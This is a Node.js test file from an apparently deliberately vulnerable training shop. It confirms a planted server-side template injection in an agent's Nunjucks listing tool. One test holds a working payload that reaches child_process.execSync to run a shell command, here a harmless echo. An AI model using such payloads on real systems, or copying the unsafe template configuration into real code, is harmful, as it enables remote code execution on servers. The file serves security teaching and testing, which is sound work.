const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const { seedShop, purgeToolCaches } = require('../_fixture.js');

const REPO = path.resolve(__dirname, '../../../..');

/**
 * @intentional-vulnerability ssti-listing-template
 * @teaches OWASP-Web:A03
 * @location agent-host/agents/listing/tools/_nunjucksSink.js
 * Nunjucks env has autoescape:false and exposes `process` globally. A
 * merchant-supplied template_source can call process.mainModule.require
 * and reach into node internals.
 */
test('ssti-listing-template: Nunjucks template reaches process.pid', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { create } = require(path.join(REPO, 'agent-host/agents/listing/tools/create.js'));
    // Simple SSTI probe — read process.pid via the exposed global.
    const tpl = '{{ process.pid }}';
    const r = await create({ title: 'SSTI Probe', description: '', price: 0, template_source: tpl });
    assert.equal(r.ok, true);
    assert.equal(String(r.rendered_template).trim(), String(process.pid));
  } finally {
    await s.close();
  }
});

/**
 * @intentional-vulnerability ssti-listing-template
 * Second proof: use child_process via the SSTI to spawn a benign command.
 */
test('ssti-listing-template: template reaches child_process via process global', async () => {
  const s = await seedShop();
  purgeToolCaches();
  try {
    const { create } = require(path.join(REPO, 'agent-host/agents/listing/tools/create.js'));
    const tpl = `{{ process.mainModule.require('child_process').execSync('echo secureshop-pwned').toString().trim() }}`;
    const r = await create({ title: 'SSTI RCE probe', description: '', price: 0, template_source: tpl });
    assert.equal(r.ok, true);
    assert.match(String(r.rendered_template), /secureshop-pwned/);
  } finally {
    await s.close();
  }
});
